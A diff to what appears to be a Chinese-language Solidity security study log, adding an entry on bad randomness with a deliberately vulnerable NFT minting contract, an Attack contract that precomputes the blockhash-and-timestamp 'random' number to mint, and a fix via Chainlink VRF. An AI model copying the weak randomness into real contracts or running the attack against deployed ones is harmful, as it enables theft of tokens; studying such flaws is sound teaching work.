@@ -2926,7 +2926,33 @@ import '@openzeppelin/contracts/access/Ownable.sol';
 
 ### 2024.10.14
 
-- [104-S07] 坏随机数
+- [104-S07] 坏随机数（Bad Randomness）
+    - 由于以太坊上所有数据都是公开透明（public）且确定性（deterministic）的，它没有其他编程语言一样给开发者提供生成随机数的方法，例如random()。很多项目方不得不使用链上的伪随机数生成方法，例如 blockhash() 和 keccak256() 方法。
+    - 漏洞例子:
+    ```solidity
+    contract BadRandomness is ERC721 {
+        uint256 totalSupply;
+        constructor() ERC721("", ""){}
+        // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint
+        function luckyMint(uint256 luckyNumber) external {
+            uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number
+            require(randomNumber == luckyNumber, "Better luck next time!");
+            _mint(msg.sender, totalSupply); // mint
+            totalSupply++;
+        }
+    }
+    contract Attack {
+        function attackMint(BadRandomness nftAddr) external {
+            // 提前计算随机数
+            uint256 luckyNumber = uint256(
+                keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
+            ) % 100;
+            // 利用 luckyNumber 攻击
+            nftAddr.luckyMint(luckyNumber);
+        }
+    }
+    ```
+    - 预防方法：使用预言机项目提供的链下随机数来预防这类漏洞，例如 Chainlink VRF。
 - [104-S08] 绕过合约检查
 - [104-S09] 拒绝服务
 
